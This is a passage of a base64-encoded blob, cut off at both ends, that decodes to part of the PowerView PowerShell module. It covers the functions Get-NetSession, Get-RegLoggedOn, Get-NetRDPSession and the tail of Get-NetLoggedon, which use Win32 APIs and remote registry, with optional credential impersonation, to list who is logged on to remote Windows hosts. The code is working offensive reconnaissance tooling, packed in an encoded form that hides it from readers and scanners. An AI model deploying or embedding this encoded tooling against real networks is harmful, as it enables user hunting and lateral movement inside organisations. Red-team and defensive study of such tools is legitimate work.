zdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewoKICAgICAgICAgICAgICAgICMgd29yayBvdXQgaG93IG11Y2ggdG8gaW5jcmVtZW50IHRoZSBwb2ludGVyIGJ5IGZpbmRpbmcgb3V0IHRoZSBzaXplIG9mIHRoZSBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkV0tTVEFfVVNFUl9JTkZPXzE6OkdldFNpemUoKQoKICAgICAgICAgICAgICAgICMgcGFyc2UgYWxsIHRoZSByZXN1bHQgc3RydWN0dXJlcwogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICMgY3JlYXRlIGEgbmV3IGludCBwdHIgYXQgdGhlIGdpdmVuIG9mZnNldCBhbmQgY2FzdCB0aGUgcG9pbnRlciBhcyBvdXIgcmVzdWx0IHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkV0tTVEFfVVNFUl9JTkZPXzEKCiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gYWxsIHRoZSBzZWN0aW9ucyBvZiB0aGUgc3RydWN0dXJlIC0gaGF2ZSB0byBkbyBpdCB0aGlzIHdheSBmb3IgVjIKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24gPSAkSW5mbyB8IFNlbGVjdC1PYmplY3QgKgogICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0TG9nZ2Vkb25dIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LU5ldFNlc3Npb24gewo8IwouU1lOT1BTSVMKClJldHVybnMgc2Vzc2lvbiBpbmZvcm1hdGlvbiBmb3IgdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSB0aGUgTmV0U2Vzc2lvbkVudW0gV2luMzJBUEkgY2FsbCB0byBxdWVyeQphIGdpdmVuIGhvc3QgZm9yIGFjdGl2ZSBzZXNzaW9ucy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIHF1ZXJ5IGZvciBzZXNzaW9ucyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpHZXQtTmV0U2Vzc2lvbgoKUmV0dXJucyBhY3RpdmUgc2Vzc2lvbnMgb24gdGhlIGxvY2FsIGhvc3QuCgouRVhBTVBMRQoKR2V0LU5ldFNlc3Npb24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIKClJldHVybnMgYWN0aXZlIHNlc3Npb25zIG9uIHRoZSAnc3Fsc2VydmVyJyBob3N0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db250cm9sbGVyIHwgR2V0LU5ldFNlc3Npb24KClJldHVybnMgYWN0aXZlIHNlc3Npb25zIG9uIGFsbCBkb21haW4gY29udHJvbGxlcnMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LU5ldFNlc3Npb24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuU2Vzc2lvbkluZm8KCkEgUFNDdXN0b21PYmplY3QgcmVwcmVzZW50aW5nIGEgV0tTVEFfVVNFUl9JTkZPXzEgc3RydWN0dXJlLCBpbmNsdWRpbmcKdGhlIENOYW1lL1VzZXJOYW1lL1RpbWUvSWRsZVRpbWUgZm9yIGVhY2ggc2Vzc2lvbiwgd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIGFkZGVkLgoKLkxJTksKCmh0dHA6Ly93d3cucG93ZXJzaGVsbG1hZ2F6aW5lLmNvbS8yMDE0LzA5LzI1L2Vhc2lseS1kZWZpbmluZy1lbnVtcy1zdHJ1Y3RzLWFuZC13aW4zMi1mdW5jdGlvbnMtaW4tbWVtb3J5LwojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU2Vzc2lvbkluZm8nKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgIyBhcmd1bWVudHMgZm9yIE5ldFNlc3Npb25FbnVtCiAgICAgICAgICAgICRRdWVyeUxldmVsID0gMTAKICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCgogICAgICAgICAgICAjIGdldCBzZXNzaW9uIGluZm9ybWF0aW9uCiAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldFNlc3Npb25FbnVtKCRDb21wdXRlciwgJycsICRVc2VyTmFtZSwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCgogICAgICAgICAgICAjIGxvY2F0ZSB0aGUgb2Zmc2V0IG9mIHRoZSBpbml0aWFsIGludFB0cgogICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCgogICAgICAgICAgICAjIDAgPSBzdWNjZXNzCiAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKCiAgICAgICAgICAgICAgICAjIHdvcmsgb3V0IGhvdyBtdWNoIHRvIGluY3JlbWVudCB0aGUgcG9pbnRlciBieSBmaW5kaW5nIG91dCB0aGUgc2l6ZSBvZiB0aGUgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFNFU1NJT05fSU5GT18xMDo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgIyBwYXJzZSBhbGwgdGhlIHJlc3VsdCBzdHJ1Y3R1cmVzCiAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgKCRpIC1sdCAkRW50cmllc1JlYWQpOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgIyBjcmVhdGUgYSBuZXcgaW50IHB0ciBhdCB0aGUgZ2l2ZW4gb2Zmc2V0IGFuZCBjYXN0IHRoZSBwb2ludGVyIGFzIG91ciByZXN1bHQgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRTRVNTSU9OX0lORk9fMTAKCiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gYWxsIHRoZSBzZWN0aW9ucyBvZiB0aGUgc3RydWN0dXJlIC0gaGF2ZSB0byBkbyBpdCB0aGlzIHdheSBmb3IgVjIKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbiA9ICRJbmZvIHwgU2VsZWN0LU9iamVjdCAqCiAgICAgICAgICAgICAgICAgICAgJFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbi5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuU2Vzc2lvbkluZm8nKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0U2Vzc2lvbl0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVJlZ0xvZ2dlZE9uIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHdobyBpcyBsb2dnZWQgb250byB0aGUgbG9jYWwgKG9yIGEgcmVtb3RlKSBtYWNoaW5lCnRocm91Z2ggZW51bWVyYXRpb24gb2YgcmVtb3RlIHJlZ2lzdHJ5IGtleXMuCgpOb3RlOiBUaGlzIGZ1bmN0aW9uIHJlcXVpcmVzIG9ubHkgZG9tYWluIHVzZXIgcmlnaHRzIG9uIHRoZQptYWNoaW5lIHlvdSdyZSBlbnVtZXJhdGluZywgYnV0IHJlbW90ZSByZWdpc3RyeSBtdXN0IGJlIGVuYWJsZWQuCgpBdXRob3I6IE1hdHQgS2VsbHkgKEBCcmVha2Vyc0FsbCkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgQ29udmVydEZyb20tU0lEICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIHF1ZXJ5IHRoZSBIS1UgcmVnaXN0cnkgdmFsdWVzIHRvIHJldHJpZXZlIHRoZSBsb2NhbApsb2dnZWQgb24gdXNlcnMgU0lEIGFuZCB0aGVuIGF0dGVtcHQgYW5kIHJldmVyc2UgaXQuCkFkYXB0ZWQgdGVjaG5pcXVlIGZyb20gU3lzaW50ZXJuYWwncyBQU0xvZ2dlZE9uIHNjcmlwdC4gQmVuZWZpdCBvdmVyCnVzaW5nIHRoZSBOZXRXa3N0YVVzZXJFbnVtIEFQSSAoR2V0LU5ldExvZ2dlZG9uKSBvZiBsZXNzIHVzZXIgcHJpdmlsZWdlcwpyZXF1aXJlZCAoTmV0V2tzdGFVc2VyRW51bSByZXF1aXJlcyByZW1vdGUgYWRtaW4gYWNjZXNzKS4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIHF1ZXJ5IGZvciByZW1vdGUgcmVnaXN0cnkgdmFsdWVzIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1SZWdMb2dnZWRPbgoKUmV0dXJucyB1c2VycyBhY3RpdmVseSBsb2dnZWQgb250byB0aGUgbG9jYWwgaG9zdC4KCi5FWEFNUExFCgpHZXQtUmVnTG9nZ2VkT24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIKClJldHVybnMgdXNlcnMgYWN0aXZlbHkgbG9nZ2VkIG9udG8gdGhlICdzcWxzZXJ2ZXInIGhvc3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbnRyb2xsZXIgfCBHZXQtUmVnTG9nZ2VkT24KClJldHVybnMgdXNlcnMgYWN0aXZlbHkgbG9nZ2VkIG9uIGFsbCBkb21haW4gY29udHJvbGxlcnMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LVJlZ0xvZ2dlZE9uIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcgoKQSBQU0N1c3RvbU9iamVjdCBpbmNsdWRpbmcgdGhlIFVzZXJEb21haW4vVXNlck5hbWUvVXNlclNJRCBvZiBlYWNoCmFjdGl2ZWx5IGxvZ2dlZCBvbiB1c2VyLCB3aXRoIHRoZSBDb21wdXRlck5hbWUgYWRkZWQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUmVnTG9nZ2VkT25Vc2VyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnCiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgIyByZXRyaWV2ZSBIS1UgcmVtb3RlIHJlZ2lzdHJ5IHZhbHVlcwogICAgICAgICAgICAgICAgJFJlZyA9IFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXldOjpPcGVuUmVtb3RlQmFzZUtleSgnVXNlcnMnLCAiJENvbXB1dGVyTmFtZSIpCgogICAgICAgICAgICAgICAgIyBzb3J0IG91dCBib2d1cyBzaWQncyBsaWtlIF9jbGFzcwogICAgICAgICAgICAgICAgJFJlZy5HZXRTdWJLZXlOYW1lcygpIHwgV2hlcmUtT2JqZWN0IHsgJF8gLW1hdGNoICdTLTEtNS0yMS1bMC05XSstWzAtOV0rLVswLTldKy1bMC05XSskJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U0lEICRfIC1PdXRwdXRUeXBlICdEb21haW5TaW1wbGUnCgogICAgICAgICAgICAgICAgICAgIGlmICgkVXNlck5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lLCAkVXNlckRvbWFpbiA9ICRVc2VyTmFtZS5TcGxpdCgnQCcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAiJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEb21haW4nICRVc2VyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyU0lEJyAkXwogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcicpCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtUmVnTG9nZ2VkT25dIEVycm9yIG9wZW5pbmcgcmVtb3RlIHJlZ2lzdHJ5IG9uICckQ29tcHV0ZXJOYW1lJyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LU5ldFJEUFNlc3Npb24gewo8IwouU1lOT1BTSVMKClJldHVybnMgcmVtb3RlIGRlc2t0b3Avc2Vzc2lvbiBpbmZvcm1hdGlvbiBmb3IgdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KCk5vdGU6IG9ubHkgbWVtYmVycyBvZiB0aGUgQWRtaW5pc3RyYXRvcnMgb3IgQWNjb3VudCBPcGVyYXRvcnMgbG9jYWwgZ3JvdXAKY2FuIHN1Y2Nlc3NmdWxseSBleGVjdXRlIHRoaXMgZnVuY3Rpb25hbGl0eSBvbiBhIHJlbW90ZSB0YXJnZXQuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCwgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIGV4ZWN1dGUgdGhlIFdUU0VudW1lcmF0ZVNlc3Npb25zRXggYW5kIFdUU1F1ZXJ5U2Vzc2lvbkluZm9ybWF0aW9uCldpbjMyQVBJIGNhbGxzIHRvIHF1ZXJ5IGEgZ2l2ZW4gUkRQIHJlbW90ZSBzZXJ2aWNlIGZvciBhY3RpdmUgc2Vzc2lvbnMgYW5kIG9yaWdpbmF0aW5nCklQcy4gVGhpcyBpcyBhIHJlcGxhY2VtZW50IGZvciBxd2luc3RhLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIGFjdGl2ZSBzZXNzaW9ucyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpHZXQtTmV0UkRQU2Vzc2lvbgoKUmV0dXJucyBhY3RpdmUgUkRQL3Rlcm1pbmFsIHNlc3Npb25zIG9uIHRoZSBsb2NhbCBob3N0LgoKLkVYQU1QTEUKCkdldC1OZXRSRFBTZXNzaW9uIC1Db21wdXRlck5hbWUgInNxbHNlcnZlciIKClJldHVybnMgYWN0aXZlIFJEUC90ZXJtaW5hbCBzZXNzaW9ucyBvbiB0aGUgJ3NxbHNlcnZlcicgaG9zdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29udHJvbGxlciB8IEdldC1OZXRSRFBTZXNzaW9uCgpSZXR1cm5zIGFjdGl2ZSBSRFAvdGVybWluYWwgc2Vzc2lvbnMgb24gYWxsIGRvbWFpbiBjb250cm9sbGVycy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtTmV0UkRQU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlciAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5SRFBTZXNzaW9uSW5mbwoKQSBQU0N1c3RvbU9iamVjdCByZXByZXNlbnRpbmcgYSBjb21iaW5lZCBXVFNfU0VTU0lPTl9JTkZPXzEgYW5kIFdUU19DTElFTlRfQUREUkVTUyBzdHJ1Y3R1cmUsCndpdGggdGhlIENvbXB1dGVyTmFtZSBhZGRlZC4KCi5MSU5LCgpodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2FhMzgzODYxKHY9dnMuODUpLmFzcHgKIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CgogICAgICAgICAgICAjIG9wZW4gdXAgYSBoYW5kbGUgdG8gdGhlIFJlbW90ZSBEZXNrdG9wIFNlc3Npb24gaG9zdAogICAgICAgICAgICAkSGFuZGxlID0gJFd0c2FwaTMyOjpXVFNPcGVuU2VydmVyRXgoJENvbXB1dGVyKQoKICAgICAgICAgICAgIyBpZiB3ZSBnZXQgYSBub24temVybyBoYW5kbGUgYmFjaywgZXZlcnl0aGluZyB3YXMgc3VjY2Vzc2Z1bAogICAg